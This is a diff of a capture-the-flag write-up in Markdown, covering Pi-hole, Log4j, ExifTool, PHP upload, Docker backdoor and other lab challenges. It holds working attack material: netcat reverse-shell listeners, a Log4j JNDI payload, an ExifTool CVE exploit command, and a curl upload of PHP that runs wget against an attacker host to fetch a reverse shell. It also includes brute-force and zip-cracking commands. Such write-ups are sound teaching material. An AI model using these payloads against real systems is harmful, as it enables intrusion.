@@ -90,11 +90,7 @@ O>* 172.16.15.0/24 [110/20] via 10.5.0.10, eth1, 16w5d14h
 
 ##### Solution
 
-A simple routing table analysis was done: since 10.5.4.0/22 is the last IP address that falls into the range of 10.5.7.0/24 subnet, then our IP address will be the one specified after *via* - `10.5.0.5`. Enter it and get the flag.
-
-##### Steps
-
-1. Enter `10.5.0.5` IP address - the IP address answer is the flag itself.
+A simple routing table analysis was done. Since 10.5.4.0/22 is the last IP address that falls into the range of 10.5.7.0/24 subnet, then our IP address will be the one specified after *via* - `10.5.0.5`. Enter it and get the flag.
 
 #### IT'S ALWAYS DNS
 
@@ -117,7 +113,7 @@ was installed.
 ![Pi-Hole landing page with version highlighted](../../images/pi-hole-version.png){: .image-process-crisp}
 
 The next obvious thing was to check if any vulnerability is present on that version in Exploit DB,
-where this was found: https://www.exploit-db.com/exploits/48519
+where this was found: <https://www.exploit-db.com/exploits/48519>
 
 An authenticated RCE, perfect!
 
@@ -153,7 +149,7 @@ Ok, make sure to have a netcat listener on "10.85.26.3:9001" ("nc -lnvp 9001") a
 
 Ok, cool. Where's the shell? Turns out it was a dud.
 
-Multiple attempts were made, but non-succeeded, but 
+Multiple attempts were made, but non-succeeded, but
 luckly after trying a custom payload to test the exploit, it was a success!
 
 ![Modified part of the RCE code](../../images/auth-rce-new-payload.png){: .image-process-crisp}
@@ -174,7 +170,7 @@ Exploit code output:
 
 ![New payload output](../../images/auth-rce-exploit-code-output.png){: .image-process-crisp}
 
-And the flag was found by following this link: http://env263.target03/admin/scripts/pi-hole/php/fun.php?cmd=cat%20/var/log/dnserror.log
+And the flag was found by following this link: <http://env263.target03/admin/scripts/pi-hole/php/fun.php?cmd=cat%20/var/log/dnserror.log>
 
 ![Found flag](../../images/always-dns-flag.png){: .image-process-crisp}
 
@@ -286,17 +282,18 @@ Password: fortnitepro123
 
 ##### Solution
 
-After logging in via SSH current file had to be closed down in the Vim editor (everyone loves Vim), then flag.txt was found in the ../schoolwork path.
+After logging in via SSH, the current file had to be closed in the Vim editor (everyone loves Vim), then `flag.txt` was found in the `../schoolwork` path.
 
 ##### Steps
 
-1. From Kali GUI - ssh billy@env263.target03 –p2223.
+In the terminal execute `ssh billy@env263.target03 –p2223`.
 
 ![Vim editor](../../images/stuck-vim.png){: .image-process-crisp}
 
-2. To exit, edit current file in a new buffer - write in Vim editor `:e .`.
+It was not as simple to exit with typing `:q!`, only by using the vim file explorer with command `:e .`
+it was possible to afterwards exit `vim`.
 
-3. Locate /home/billy/schoolwork path and open flag.txt file through nano text editor, copy the text as the final output answer (flag - `ctftech{hardest-challenge}`).
+Located the flag in `/home/billy/schoolwork` and used `nano` to view the contents of the file and found the flag: `ctftech{hardest-challenge}`.
 
 #### FRIDGE
 
@@ -379,7 +376,6 @@ The flag was found!
 
 ![Mailbox flag found](../../images/mailbox-flag-found.png){: .image-process-crisp}
 
-
 #### MINECRAFT
 
 ```md
@@ -405,7 +401,7 @@ first.
 
 Seemed like no way to connect to the server, couldn't get a client installed properly, so a decision to find a similar ctf challenge was made.
 
-Found this: https://ctftime.org/writeup/20489, which in turn linked to this nice CLI tool https://mccteam.github.io/.
+Found this: <https://ctftime.org/writeup/20489>, which in turn linked to this nice CLI tool <https://mccteam.github.io/>.
 
 Having this installed, it was possible to connect to the server, not
 exactly as simple as this at the start, couldn't get it to connect.
@@ -426,7 +422,7 @@ But... "Connection has been lost."
 
 ![MCC connection lost](images/mcc-connection-lost.png){: .image-process-crisp}
 
-So what was the problem? It needed a username. There was a lot of 
+So what was the problem? It needed a username. There was a lot of
 struggle, but it was this simple.
 
 None tried the exploit before and I was just as oblivious when attempting it, spent some good time mistyping jndi as jindi.
@@ -436,7 +432,7 @@ None tried the exploit before and I was just as oblivious when attempting it, sp
 Once the `jndi` was properly typed, the response as handing and that's where we finally found that the exploit was possible.
 
 The exploit that will be used is from David Bombal video, you can
-find his repository here: https://github.com/davidbombal/log4jminecraft
+find his repository here: <https://github.com/davidbombal/log4jminecraft>
 
 Athough the default payload was not working because of special character issues, it was ran 2 times. Once to get the reverse shell on the machine and second to run the reverse shell.
 
@@ -480,7 +476,7 @@ public class Log4jRCE {
 }
 ```
 
-Before triggering the payload a small setup was needed. 
+Before triggering the payload a small setup was needed.
 
 1. Run the java compile and exploit serve script.
 2. Run the reverse shell http serve script.
@@ -489,7 +485,7 @@ Before triggering the payload a small setup was needed.
 
 After everything was setup, the following script was ran in the MC client to send the chat message
 
-```
+```bash
 /send ${jndi:ldap://10.85.26.3:1389/Log4jRCE}
 ```
 
@@ -533,11 +529,11 @@ xfreerdp /v:env263.target04 /u:Administrator /p:Cool2Pass
 
 And greeted with this nice picture of a chicken
 
-![Chicken desktop](../../images/chicken.png){: .image-process-crisp}
+![Chicken desktop](images/chicken.png){: .image-process-crisp}
 
 Remembering what was mentioned in the description "Mother complaining", "failed logins", a good start would be to open "Internet Explorer" and check the history.
 
-![Internet Explorer history](../../images/ie-history.png){: .image-process-crisp}
+![Internet Explorer history](images/ie-history.png){: .image-process-crisp}
 
 Surely there's the Admiral's page, so we're on the right browser and
 the history contains some peculiar entries, but not so useful.
@@ -649,7 +645,7 @@ Since entering in a regular IPv4 format address returned *"Not a public IP addre
 
 ##### Steps
 
-1. Go to https://dnschecker.org/ip-to-decimal.php and convert `172.20.10.2` IP address to decimal numeral system.
+1. Go to <https://dnschecker.org/ip-to-decimal.php> and convert `172.20.10.2` IP address to decimal numeral system.
 
 2. The desired output is an integer number: `2886994434`, which bypasses IP address filtering.
 
@@ -717,13 +713,9 @@ Quick google search reveals to us that ExifTool is a free and open-source softwa
 ##### Steps
 
 1. Google search the exploit: `https://github.com/UNICORDev/exploit-CVE-2021-22204`, download it by using `git` commands.
-
 2. Launch a `netcat` utility reverse shell listener on `9001` port: `nc -lvnp 9001`
-
 3. Launch a CVE exploit and specify IP address through `-s` flag: `python3 exploit-CVE-2021-22204.py -s 10.X.Y.Z 9001` (here the real IPv4 address is hidden on purpose).
-
 4. Upload any file to the ExifTool service.
-
 5. Shell exploit works - by looking inside `/home` folder a suspicious `/user1337` folder is found - inside it a `flag.txt` file can be seen. Retrieved flag from the file is : `ctftech{ff379755-33f3}`.
 
 #### SMART BIKE
@@ -740,29 +732,54 @@ The only thing we know is the exposed IP address.
 
 ##### Solution
 
-By accessing the http://envXYZ.target03:8000/ environment we can see that main page doesn't give any specifical info. Overall, the main solution of the problem was to scan API endpoints in, then feed in fake file to access `/var/flag.txt` file and get the desired flag.
+By scanning `http://envXYZ.target03:8000/` with gobuster, `robots.txt` was found which led to `/js/config.js`
+containing the API key to the API which was vulnerable to LFI using the `file` parameter.
 
 ##### Steps
 
-1. Access `http://envXYZ.target03:8000/` environment and scan directories by using gobuster - a tool used to brute-force URIs including directories and files as well as DNS subdomains: `gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/common.txt`.
+Access `http://envXYZ.target03:8000/` and scan directories using [gobuster](https://github.com/OJ/gobuster)
+with the `common.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists)
 
-2. By looking at scanned directories and files a `robots.txt` file was inspected. It contains the following info:
+```bash
+gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+Looking at the scan results, `robots.txt` file found which contained the following info:
 
 ![Robots file](../../images/smart-bike-robots.png){: .image-process-crisp}
 
-3. Find config.js file and inspect it - it is revealed that there is an `/upl` endpoint which will contain uploaded files, as well as a desired API key.
+Visiting `/js/config.js` in the browser, revealed `/upl` endpoint that is used to store files uploaded
+by using the "create" method by the API and along with that the API key.
 
 ![Config file](../../images/smart-bike-api.png){: .image-process-crisp}
 
-4. Create a reverse shell listener on `9002` port to listen for connections: nc -lvnp 9002.
+Create a reverse shell listener on `9002` port to listen for connections: `nc -lvnp 9002`.
 
-5. Feed in a malicious `rev.php` reverse shell PHP file through `curl` command POST request by providing apiKey value from `config.js` file to the environment's `/api` endpoint: `curl -X POST -d "apiKey=37e4950e-d638-4e9f-9fe1-56baac1b85f2&method=create&filename=create_rev.php&content=<?php passthru('wget 10.X.Y.Z:9002/rev.php'); ?>" http://envXYZ.target03:8000/api/`
+Prepare a PHP reverse shell with name `rev.php` and run an HTTP server for downloading it later.
 
-6. Trigger reverse shell by visiting `/upl` endpoint which now contains an uploaded malicious PHP file: `http://envXYZ.target03:8000/upl/rev.php`
+- Payload used: <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>
+  - Needs IP and PORT changed.
 
-7. Start a python server through `python3 -m http.server 9002` to dispatch requests. 
+```bash
+# Download payload
+# - edit the CHANGEME's
+curl https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -O rev.php
 
-8. From the listener side access `/var/flag.txt` file to get the desired flag: `ctf-tech{757422a2-67e2}`.
+# Run the HTTP web server.
+python3 -m http.server 9002
+```
+
+Now to exploit the API. Do a POST request with the apiKey value from `config.js` file to the `/api` endpoint.
+
+```bash
+curl -X POST -d "apiKey=37e4950e-d638-4e9f-9fe1-56baac1b85f2&method=create&filename=create_rev.php&content=<?php passthru('wget 10.X.Y.Z:9002/rev.php'); ?>" http://envXYZ.target03:8000/api/
+```
+
+Trigger reverse shell by visiting `/upl/create_rev.php` which executes the PHP code in the `create_rev.php` file.
+Our payload should be found afterwards and triggered by visiting `/upl/rev.php`.
+
+If everything was done correctly, the listener should have a new connection established to the target machine.
+Finally `cat` out the flag from `/var/flag.txt`.
 
 #### SELF-DRIVING-CAR
 
@@ -806,15 +823,17 @@ Find out if there is some vulnerability, backdoor, misconfiguration, etc. that w
 Digital Signage Management Interface
 Flag will be given when correct login credentials are used.
 
-<http://env263.target03:8888/>
+http://env263.target03:8888/
 ```
+
 ##### Solution
 
-No particular solution whatsoever due to the challenge not working properly in this CTF contest. 
+No particular solution whatsoever due to the challenge not working properly. When visiting the challenge site, the
+flag was all over the page. :)
 
 ##### Steps
 
-To get the flag - simply open webpage and copy-paste it. Flag: `ctf-tech{811d4c0e-33e7}`.
+To get the flag, simply open webpage and the flag is there..
 
 #### MAPS
 
@@ -825,7 +844,7 @@ You decide to take matters into your own hands.
 QUESTION
 Find a vulnerability in the city guide application and for POC, read the flag from /var/flag.txt
 
-<http://env263.target03:8111/>
+http://env263.target03:8111/
 ```
 
 ##### Solution
@@ -862,7 +881,7 @@ SOC has managed to acquire two encrypted messages and a plain text message, that
 QUESTION
 Identify the encryption key and recover the other plaintext.
 Get the files from HERE
-<https://static.ctftech.io/challs/captured_files.zip?_gl=1>*1t9e0jc*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.
+https://static.ctftech.io/challs/captured_files.zip?_gl=1*1t9e0jc*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.
 ```
 
 #### SMART AIRSPACE
@@ -884,17 +903,17 @@ Here is the invite to the server <https://discord.com/invite/cboe>
 
 ##### Solution
 
-Using discord invite link a CTF Tech Bot was visible as one of the first users on the server - by providing answers to the bot's questions CTF flag was successfully acquired.
+Using the CTF discord invite link a CTF Tech Bot was visible as one of the first users on the server - by providing answers to the bot's questions the flag was successfully acquired.
 
 ##### Steps
 
-1. After accessing bot's DM's a *!minictf* was input which provided the following output: 
+1. After sliding into the bot's DM's a *!minictf* was sent that resulted in the following reply:
 
 ![Command output](../../images/automated-minictf.png){: .image-process-crisp}
 
 Correct answer is 00100000 (converting 32 from decimal to binary).
 
-2. After that the following question was provided: 
+2. After that the following question was provided:
 
 ![Linux answer](../../images/automated-linux.png){: .image-process-crisp}
 
@@ -954,16 +973,15 @@ Investigate the ATIS call to see if you can find anything odd!
 
 ##### Solution
 
-Simple solution - download Audacity open-source audio editor software, then open the provided audio file and switch to the spectrogram view to see the flag.
+Simple solution - download [Audacity](https://www.audacityteam.org/download/)
+(open-source audio editor software), then open the provided audio file and switch to the spectrogram view
+to see the flag.
 
 ##### Steps
 
 1. Download Audacity.
-
 2. Open the specified file through Audacity.
-
 3. Switch to the Spectogram View.
-
 4. Flag is shown in the spectrogram window: `ctf-tech{f571324-9bd3}`.
 
 ![Automated flag](../../images/atis-flag.png){: .image-process-crisp}
@@ -979,23 +997,31 @@ Inspect the flight plan, find out if there is anything malicious hidden in it.
 Flag format: uuid v4
 <https://static.ctftech.io/challs/flight-plan.pdf?_gl=1>*18nguau*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDkxMjAyOC43LjEuMTY2NDkxMjAyOS4wLjAuMA..
 ```
+
 ##### Solution
 
-For this task `qpdf` package and Wine were used to access the desired flag.
+For this task `qpdf` package and Wine was used to access the flag. The flag was in an different PDF attached to
+the given one, which needed to be extracted using a utility tool, the attachemnt was a windows executable, but for that `wine` was used.
 
 ##### Steps
 
-1. Install qpdf package through `sudo apt-get install qpdf`
+1. Install qpdf package with `sudo apt-get install qpdf`.
 
 2. List attachments of the PDF file: `qpdf --list-attachments flight-plan.pdf`  
 
-![PDF contents](../../images/flight-plan-contents.png){: .image-process-crisp}
+![PDF contents](images/flight-plan-contents.png){: .image-process-crisp}
 
-3. Convert this attachment through `qpdf` to another PDF file: `qpdf --show-attachment="ATS flight plan-ori" flight-plan.pdf > attachment.pdf`
+3. Export the found attachment.
 
-4. Open `attachment.pdf` through Wine compatibility layer to open the desired PDF as you would do it on a Windows platform: `wine ATS\ flight\ plan-ori.pdf`
+```bash
+qpdf --show-attachment="ATS flight plan-ori" flight-plan.pdf > attachment.pdf
+```
 
-5. The desired flag gets outputted after opening the file: `3a4425f2-8882-428c-ab84-8adecf15a394`.
+4. Open `attachment.pdf` using `wine` with command: `wine ATS\ flight\ plan-ori.pdf`
+
+- The attachment was not a PDF file, but a Windows executable.
+
+5. The flag is displayed after opening the attachment using `wine`.
 
 ![PDF flag](../../images/flight-plan-flag.png){: .image-process-crisp}
 
@@ -1050,37 +1076,53 @@ Password: Cool2Pass
 
 ##### Solution
 
-First of all, we need to connect to the server through an SSH command. After that configure basic authentication by using `https://www.howtogeek.com/devops/how-to-setup-basic-http-authentication-on-apache/` guide. After restart of the service enter credentials and flag will be yours.
+The challenge was solved by connecting to the server, adding authentication to the `evidence` folder and after a restart of the service it was possible to get the flag by "submit'ing" the challenge which used a script to check if the authentication was correctly set.
+
+Links used when going through the challenge:
+- https://www.howtogeek.com/devops/how-to-setup-basic-http-authentication-on-apache/
+- https://coderwall.com/p/zvvgna/create-htpasswd-file-for-nginx-without-apache
 
 ##### Steps
 
-1. Login through SSH: `sshpass -p Cool2Pass ssh -p 2222 user@env263.target02`.
+1. Connect using SSH: `sshpass -p Cool2Pass ssh -p 2222 user@env263.target02`.
 
-2. Examine the structure of `/var/www/html` folder. Inside it there is an `evidence` folder that needs to be protected.
+- `sshpass` needs to be installed separately.
 
-![HTML folder](../../images/top-secret-html.png){: .image-process-crisp}
+2. Examine the contents of `/var/www/html`. The `evidence` folder needs to be protected.
 
-3. Follow the guide provided in the link in the Solution section above: `https://www.howtogeek.com/devops/how-to-setup-basic-http-authentication-on-apache/`.
+![HTML folder](images/top-secret-html.png){: .image-process-crisp}
 
-*Generate a password file (the first option):* `sudo printf "mulder:openssl passwd -apr1 Scully-th3-b3st\!\n" | sudo tee .htpasswd mulder:$apr1$xVxxLLon$ASAgafxUZWNMiaSJzbK1n.`
+3. Change current directory to `/var/www/html/evidence` and execute the following:
 
-*To do it the other way:*
+```bash
+# Generated a password file
+$ sudo printf "mulder:`openssl passwd -apr1 Scully-th3-b3st\!`\n" | sudo tee .htpasswd
+mulder:$apr1$xVxxLLon$ASAgafxUZWNMiaSJzbK1n.
+```
 
-Open the configuration: `sudo vim /etc/apache2/apache2.conf`
+- This generates a credential file for the specific folder.
 
-*Add the following content:*
+4. Open apache configuration and specify that the directory is protected:
 
+```bash
+# Did the following, because it didn't immediatelly work
+# Opened the configuration
+sudo vim /etc/apache2/apache2.conf
+
+# added the following content
 <Directory "/var/www/html">
   AuthType Basic
   AuthName "Restricted Content"
   AuthUserFile /etc/apache2/.htpasswd
-  Require valid-user </Directory>
+  Require valid-user
+</Directory>
+```
 
-*Restart service:* `sudo service apache2 restart`
+5. Finally restarted the apache service using `sudo service apache2 restart` and after pressing submit in the challenge platform, was able to pass the challenge.
 
-4. Re-open the page on the web and enter credentials as specified in the task and get the desired flag.
+Here's the expected login prompt:
 
-![HTML folder](../../images/top-secret-login.png){: .image-process-crisp}
+![Login prompt](images/top-secret-login.png){: .image-process-crisp}
 
 #### BACKDOORED IMAGE
 
@@ -1094,25 +1136,36 @@ QUESTION
 What flag is stored in the backdoor?
 Pull the jumphost image from docker.io/cybexer/ctf-jumphost:latest and find out how the image was compromised.
 ```
+
 ##### Solution
 
-First of all, Docker Hub was inspected where the image was stored. After that Docker was saved to a .tar file, then the .tar file was extracted (docker imager layer decomposition). After accessing malicious shell script a flag was retrieved.
+First Docker Hub was used to inspect the hosted image and using that information the image was download and saved to a `.tar` file, then the file was extracted to be able to search the individual layers of the image. After doing some `find` one-liners the malicious shell script was found containing the flag.
+
+Due to the attacker not deleting the persistance script in the same layer, it was possible to find the flag.
 
 ##### Steps
 
-1. Go to Docker Hub and check all of the image layers. The specifical layer that we are interested in is layer nr. 9, in which a quite interesting persistence.sh bash script is being executed.
+1. Go to Docker Hub and check all of the image layers. The layer that we are interested in is layer 9, in which a quite interesting `persistence.sh` bash script is being executed.
 
-![Docker image layers](../../images/backdoor-image-layers.png){: .image-process-crisp}
+![Docker image layers](images/backdoor-image-layers.png){: .image-process-crisp}
 
-2. Save docker image in a tar file: `docker save docker.io/cybexer/ctf-jumphost:icsc > icsc-image.tar`.
+2. Extract the docker image into a `.tar` file.
 
-3. Extract the image save: `tar -xf icsc-image.tar`.
+```bash
+docker save docker.io/cybexer/ctf-jumphost:icsc > icsc-image.tar
+```
 
-4. Extract all of the image layers by using linux *find* command: `find -name layer.tar -exec tar -xf {} \;`.
+3. Unarchive the file with `tar -xf icsc-image.tar`.
 
-![Layer.tar structure](../../images/backdoor-layer-tar.png){: .image-process-crisp}
+4. Unarchive all of the image layers by using linux `find` command.
 
-5. A persistence.sh script can be see in the screenshots above - to get the flag simply open it. CTF flag is: `d4da58b6-d572-4992-8342-7747969911d5`.
+```bash
+find -name layer.tar -exec tar -xf {} \;
+```
+
+![Layer.tar structure](images/backdoor-layer-tar.png){: .image-process-crisp}
+
+5. A `persistence.sh` script can be seen in the screenshots above and to get the flag simply open it.
 
 #### LEAKED DATA (UNSOLVED)
 
@@ -1140,23 +1193,34 @@ QUESTION
 Investigate if you can still recover some unencrypted files from the system.
 ATC Radar
 ```
+
 ##### Solution
 
-The solution was to use a Kali Linux `ffuf` web fuzzer package - it is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing. Login/password were guessed, but for authentication part metasploit framework could be used as well to brute-force a way in and get the credentials.
+The solutions was to directory brute-force the server after guessing/brute-forcing the admin user account in order to find the credentials stored in a password protected backup file which was cracked using `zip2john`.
+
+- The fuzzer used was [`ffuf`](https://github.com/ffuf/ffuf) (metasploit could also be used for this).
 
 ##### Steps
 
-1. Login as admin:password
+0. Brute-force or guess the credentials.
 
-2. The following command was run in the terminal: `ffuf -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -u http://env263.target03:8080/FUZZ -mc 200 -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="`
+1. Use the credentials to create a Basic Auth base64 string `echo -n "admin:password" | base64`.
 
-![ATC directories](../../images/atc-ffuf.png){: .image-process-crisp}
+2. Perform an authenticated directory brute-force attack with the credentials.
 
-3. By looking at the available endpoints and accessing /directory we can see a password-protected .zip file inside. Download it through wget utility and bruteforce by using zip2john. Cracked password is: `987654321`.
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -u http://env263.target03:8080/FUZZ -mc 200 -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="
+```
+
+![ATC directories](images/atc-ffuf.png){: .image-process-crisp}
+
+3. By looking at the results and accessing `/directory` we can see a password-protected .zip file inside. Download it using `wget` and bruteforce by using `zip2john`.
+
+- Cracked password is: `987654321`.
 
 ![Encrypted ZIP](../../images/atc-zip.png){: .image-process-crisp}
 
-4. Enter password in the archive and retrieve the flag. Flag is: `ctftech{6b0239c5-23da-4301-b391-99ed9a078fa1}`
+4. Enter password in the archive and retrieve the flag.
 
 ##### Solution
 
